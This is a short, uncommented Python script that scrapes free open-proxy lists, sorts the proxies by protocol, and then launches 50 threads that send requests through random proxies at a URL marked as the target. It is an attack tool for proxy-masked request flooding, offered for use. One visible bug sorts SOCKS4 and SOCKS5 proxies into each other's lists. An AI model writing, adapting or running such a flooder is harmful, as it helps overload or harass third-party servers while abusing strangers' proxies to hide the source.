#!/usr/bin/env python3

import requests
import random
import re
import threading
import os

url = 'http://www.icanhazip.com' #TARGET
httpproxies = []
socks4proxies = []
socks5proxies = []
def get_proxies():
	proxies = []
	res = requests.get('https://free-proxy-list.net').text
	p = re.findall('(\d+\.\d+\.\d+\.\d+):(\d+)',res)
	for proxy in p:
		proxies.append(proxy[0]+':'+proxy[1])
	return proxies

def check_proxies(proxies):
	s= requests.Session()
	for proxy in proxies:
		b = False
		try:
			s.proxies = {"http":proxy,"https":proxy}
			res = s.get(url,timeout = 1.5)
			if res :
				b = True
				httpproxies.append(proxy)
		except Exception as e:
			print("\n Not a http/https proxy")
		if b == False:
			try:
				s.proxies = {"http":"socks5://"+proxy,"https":"socks5://"+proxy}
				res = s.get(url,timeout = 1.5)
				if res:
					b= True
					socks4proxies.append(proxy)
			except Exception as e:
					print("\n Not a socks5 proxy")
		if b == False:	
			try:
				s.proxies = {"http":"socks4://"+proxy,"https":"socks4://"+proxy}
				res = s.get(url,timeout =1.5)
				if res:
					socks5proxies.append(proxy)
			except Exception as e:
				print("\n Not a socks4 proxy")
	print(httpproxies)


def attack():
	s= requests.Session()
	if httpproxies:
		hproxy = random.choice(httpproxies)
		for i in range(2):
			s.proxies = {"http":hproxy,"https":hproxy}
			res = s.get(url,timeout = 1.5)
			print(res.text)
	if socks4proxies:
		s4proxy = random.choice(socks4proxies)
		for j in range(2):
			s.proxies = {"http":"socks4://"+s4proxy,"https":"socks4://"+s4proxy}
			res = s.get(url,timeout =1.5)
			print(res.text)
	if socks5proxies:
		s5proxy = random.choice(socks5proxies)
		for k in range(2):
			s.proxies = {"http":"socks5://"+s5proxy,"https":"socks5://"+s5proxy}
			res = s.get(url,timeout = 1.5)
			print(res.text)

if __name__ == "__main__":
	print("START!")
	proxies = get_proxies()
	print("Up proxies:")
	print(proxies)
	print("Party starts in 321..............")
	check_proxies(proxies)
	for i in range(50):
		t = threading.Thread(target=attack)
		t.start()

